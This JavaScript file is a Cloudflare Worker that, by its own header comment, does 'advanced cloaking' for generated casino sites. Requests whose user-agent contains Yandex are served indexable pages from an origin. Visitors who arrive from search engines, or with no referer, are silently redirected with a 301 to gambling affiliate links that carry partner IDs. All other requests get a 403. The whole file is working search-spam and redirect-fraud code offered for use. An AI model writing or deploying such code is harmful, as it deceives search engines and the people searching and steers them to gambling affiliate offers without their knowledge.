/**
 * Cloudflare Worker - Advanced Cloaking with Generated Sites
 * YandexBot: 200 OK - serve generated casino sites from origin
 * Search users: 301 redirect to referral link (subdomain-specific)
 * Others: 403 Forbidden
 */

const referralLinks = {
  'default': 'https://kgpar.com/refs/share?refId=cross_1&partnerId=11577&authorization=signup',
  'kilogram': 'https://kgpar.com/refs/share?refId=subkilo&partnerId=11577&authorization=signup',
  'sykaaa': 'https://s-way-q.com/?source=sub_sykaaa&pid=408245'
};

const ORIGIN = 'https://origin.example.com';

export default {
  async fetch(request) {
    const url = new URL(request.url);
    const userAgent = request.headers.get('user-agent') || '';
    const referer = request.headers.get('referer') || '';
    
    const hostname = url.hostname;
    const parts = hostname.split('.');
    let subdomain = 'default';
    
    if (parts.length > 2) {
      subdomain = parts[0];
    }

    if (userAgent.includes('YandexBot') || userAgent.includes('Yandex')) {
      try {
        const originRequest = new Request(
          `${ORIGIN}${url.pathname}${url.search}`,
          {
            method: request.method,
            headers: {
              ...Object.fromEntries(request.headers),
              'X-Forwarded-For': request.headers.get('cf-connecting-ip'),
              'X-Original-Host': hostname,
              'X-Cloaking-Mode': 'yandex'
            },
            cf: {
              cacheTtl: 3600,
              cacheEverything: true,
              minify: {
                javascript: true,
                css: true,
                html: true
              }
            }
          }
        );

        const response = await fetch(originRequest);
        const clonedResponse = new Response(response.body, response);
        clonedResponse.headers.set('Cache-Control', 'public, max-age=3600');
        clonedResponse.headers.set('X-Robots-Tag', 'index, follow');
        clonedResponse.headers.set('X-Cache-Mode', 'YandexBot-Full');
        
        console.log(`[YandexBot] ${url.pathname} from ${subdomain}`);
        
        return clonedResponse;
      } catch (error) {
        console.error(`[YandexBot Error] ${error.message}`);
        return new Response('YandexBot Error', { status: 500 });
      }
    }

    const searchEngines = ['yandex', 'google', 'bing', 'duckduckgo', 'baidu', 'yahoo'];
    const isFromSearch = searchEngines.some(engine => 
      referer.toLowerCase().includes(engine)
    );

    if (isFromSearch) {
      const referralUrl = referralLinks[subdomain] || referralLinks['default'];
      
      console.log(`[Search Redirect] ${subdomain} -> ${referralUrl}`);
      
      return new Response(null, {
        status: 301,
        headers: {
          'Location': referralUrl,
          'Cache-Control': 'no-cache'
        }
      });
    }

    if (!referer) {
      const referralUrl = referralLinks[subdomain] || referralLinks['default'];
      console.log(`[Direct Access] ${subdomain} -> ${referralUrl}`);
      
      return new Response(null, {
        status: 301,
        headers: {
          'Location': referralUrl,
          'Cache-Control': 'no-cache'
        }
      });
    }

    console.log(`[Blocked] ${url.toString()} | UA: ${userAgent.substring(0, 50)}`);
    
    return new Response('Access Denied', {
      status: 403,
      headers: {
        'Content-Type': 'text/plain',
        'Cache-Control': 'no-cache'
      }
    });
  }
};
